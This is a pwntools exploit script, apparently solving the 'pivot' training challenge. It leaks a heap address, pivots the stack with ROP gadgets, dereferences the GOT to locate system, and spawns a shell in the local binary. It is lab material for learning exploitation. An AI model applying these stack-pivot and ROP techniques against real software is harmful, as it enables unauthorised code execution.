from pwn import *
import re

pop_rax = p64(0x0000000000400b00)         # pop rax; ret;
xchg_rax_rsp = p64(0x0000000000400b02)    # xchg rax, rsp; ret;
mov_rax_ptr_rax = p64(0x0000000000400b05) # mov rax, qword ptr [rax]; ret;
jmp_rax = p64(0x00000000004008f5)         # jmp rax;
pop_rbp = p64(0x0000000000400900)         # pop rbp; ret;
add_rax_rbp = p64(0x0000000000400b09)     # add rax, rbp; ret;
call_rax = p64(0x000000000040098e)        # call rax;
pop_rdi = p64(0x0000000000400b73)         # pop rdi; ret;
push_rbp_mov_rbp_rsp_call_rax = p64(0x000000000040098a) # push rbp; mov rbp, rsp; call rax;
mov_rbp_rsp_call_rax = p64(0x000000000040098b) # mov rbp, rsp; call rax;
leave = p64(0x0000000000400a39)                 # leave; ret;
pop_13_14_15 = p64(0x0000000000400b6e)         # pop r13; pop r14; pop r15; ret;
pop_rsi_14 = p64(0x0000000000400b71)           # pop rsi; pop r15; ret;

ret2win = 0x7ffff7bd3abe
foothold = 0x7ffff7bd3970

# 0x0000000000400850 <+0>:  jmp    QWORD PTR [rip+0x2017f2]        # 0x602048
# jump here first to resolve symbols.
plt_foothold = p64(0x0000000000400850)
data = p64(0x602068)
binsh = "/bin/sh\x00"

# "sh" string in binary
sh = p64(0x400c76)

# we need to dereference this to get runtime GOT entry.
foothold_got = p64(0x602048)
offset = ret2win - foothold

hexreg = "0[xX][0-9a-fA-F]+"

def JumpToHeap(heap_addr):
  ret  = ""
  ret += pop_rax
  ret += p64(heap_addr)
  ret += xchg_rax_rsp
  return ret

def CallSystem():
  ret  = ""

  # Resolve address
  ret += plt_foothold

  # Setup system by being in ret2win
  ret += pop_rax
  ret += foothold_got
  ret += mov_rax_ptr_rax
  ret += pop_rbp
  ret += p64(offset + 0xb) # Get to system call in ret2win
  ret += add_rax_rbp
  ret += pop_rdi # get binsh
  ret += sh     
  ret += jmp_rax

  return ret

elf = ELF('pivot')

io = process(elf.path)
leaked = io.recvuntil("> ")

m = re.search(hexreg, leaked)
pls = m.group()
heap = int(pls, 16)

pad = 'A'*40

info("heap addr: " + hex(heap))

# for stack
rops = pad + JumpToHeap(heap)

# for heap
roph = CallSystem()

io.sendline(roph)

leaked = io.recvuntil("> ")
io.sendline(rops)

io.interactive()





